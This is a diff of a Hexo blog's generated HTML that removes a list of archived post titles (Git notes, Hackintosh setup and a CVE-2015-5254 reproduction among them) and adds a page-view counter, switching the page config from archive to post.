-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/13/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-01-13T15:29:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/13/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Git学习笔记</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/12/Mac%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-01-12T05:51:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/12/Mac%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">Mac使用笔记</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<!--显示阅读次数-->
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/12/%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/" class="archive-article-date">
-  	<time datetime="2020-01-11T16:16:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/12/%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">黑苹果安装配置</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术闲谈</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/11/Hexo-%E4%BB%93%E5%BA%93%E8%BF%81%E7%A7%BB/" class="archive-article-date">
-  	<time datetime="2020-01-11T15:59:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/11/Hexo-%E4%BB%93%E5%BA%93%E8%BF%81%E7%A7%BB/">Hexo 仓库迁移</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术闲谈</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E7%A1%AC%E7%9B%98%E6%81%A2%E5%A4%8D/" class="archive-article-date">
-  	<time datetime="2020-01-07T10:50:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E7%A1%AC%E7%9B%98%E6%81%A2%E5%A4%8D/">格式化硬盘恢复</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术闲谈</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/04/CVE-2015-5254%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-01-04T01:18:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/04/CVE-2015-5254%E5%A4%8D%E7%8E%B0/">CVE-2015-5254复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2020/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2020/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2020/page/3/">3</a><a class="extend next" rel="next" href="/archives/2020/page/3/">Next &amp;raquo;</a>
-    </nav>
-  
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
 
 
           </div>
@@ -569,8 +489,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
